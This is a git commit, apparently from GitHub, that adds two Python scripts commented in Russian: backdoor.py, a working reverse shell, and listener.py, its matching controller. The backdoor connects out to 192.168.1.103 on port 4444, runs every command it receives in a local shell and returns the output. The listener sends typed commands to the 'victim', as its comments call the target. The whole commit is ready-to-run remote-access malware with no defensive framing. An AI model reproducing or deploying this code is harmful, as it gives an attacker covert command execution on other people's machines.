2763e5f15d5298c353f9edc0c1e589a296b56388
aaalllexxx <74644667+aaalllexxx@users.noreply.github.com>
2021-09-05 15:38:11 +0300

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,30 @@
+import socket
+import subprocess
+import os
+
+data = b''
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаём объект класса socket
+connection.connect(("192.168.1.103", 4444))  # поключаемся к определённому ip к 4444 порту
+connection.send(b"you have access to shell")
+
+
+def shell(command):  # функция, которая будет выполнять команды и возвращать результат
+    # если длинна команды больше одного слова и начинается с 'cd'
+    # то переходим по дирректории после "cd" и ответ будет равен директории, в которую мы перешли
+    # а если длинна команды меньше или равно 1 слову или начинается не с 'cd' то просто получаем ответ
+    # от коммандной строки и добавляем его в переменную, отвечающую за ответ и после чего возвращаем ответ
+    if len(command.split()) > 1 and command.split()[0] == "cd":
+        os.chdir(command.split()[1])
+        call = command.split()[1]
+
+    else:
+        call = subprocess.getoutput(command)
+    return call
+
+
+while True:
+    data = connection.recv(1024)  # принимаем данные от соединения
+    # дешифруем их, обрезаем пробелы с начала и с конца и получаем ответ от терминала
+    callback = shell(data.decode('utf8').strip()) + "\n"
+    # отправляем полученный ответ в байтах(раньше можно было отправить строку, сейчас нельзя)
+    connection.send(bytes(callback, encoding="utf8"))
---
+++ listener.py
@@ -0,0 +1,18 @@
+import socket
+
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаём объект класса socket
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+listener.bind(("192.168.1.103", 4444))  # привязываем ip и порт
+listener.listen()  # прослушиваем порт
+print("[+]Waiting for connection...\n")
+connection, address = listener.accept()  # как только подключение установленно, получаем адресс жертвы и подключение
+print("[+]Connected to " + address[0] + "\n")
+while True:
+    data = connection.recv(1024)  # получаем ответ
+    print(data.decode("utf8"))  # декодируем и выводим
+    print("[#]", end="")  # даём знать, что можно вводить команду
+
+    cmd = input()  # получаем команду
+    if cmd == "exit":
+        break
+    connection.send(bytes(cmd, encoding="utf8"))  # отправляем команду жертве
